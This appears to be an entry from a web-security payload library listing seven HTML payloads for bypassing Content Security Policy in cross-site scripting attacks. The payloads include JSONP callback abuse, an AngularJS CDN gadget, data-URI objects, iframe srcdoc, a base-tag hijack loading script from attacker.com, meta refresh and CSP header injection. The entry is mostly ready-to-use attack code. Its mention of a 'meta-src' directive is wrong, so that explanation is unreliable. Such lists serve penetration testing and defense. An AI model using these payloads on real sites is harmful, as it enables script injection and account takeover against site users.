---
id: "xss-csp_bypass-payloads"
title: "XSS Payloads - CSP Bypass Payloads"
type: "payload"
category: "web-application"
subcategory: "xss"
tags: ["xss", "csp_bypass", "payload"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques"]
updated: "2026-03-30"
---

## Overview

Payloads designed to bypass Content Security Policy restrictions — the primary modern XSS defense

## Payloads

### JSONP Callback Abuse

Abuse JSONP endpoints on whitelisted domains to execute arbitrary callbacks

- **Contexts**: html
- **Severity**: high

```html
<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
```

### AngularJS Script Gadget

Load AngularJS from whitelisted CDN and eval templates — bypasses script-src

- **Contexts**: html
- **Severity**: high

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

### Object Data URI

Use object element with data URI when object-src is missing from CSP

- **Contexts**: html
- **Severity**: high

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

### IFrame SrcDoc CSP Inherit

srcdoc creates new document context that may inherit weaker CSP

- **Contexts**: html
- **Severity**: high

```html
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
```

### Base Tag Hijack

Inject base tag to redirect relative script URLs to attacker domain

- **Contexts**: html
- **Severity**: high

```html
<base href="https://attacker.com/"><script src="/payload.js"></script>
```

### Meta Refresh JavaScript

Meta refresh to javascript: URI — works when meta-src not restricted

- **Contexts**: html
- **Severity**: medium

```html
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

### CSP Header Injection

When CSP header reflects user input, inject permissive directives

- **Contexts**: url
- **Severity**: high

```html
/?csp=; script-src * 'unsafe-inline';&xss=<script>alert(1)</script>
```
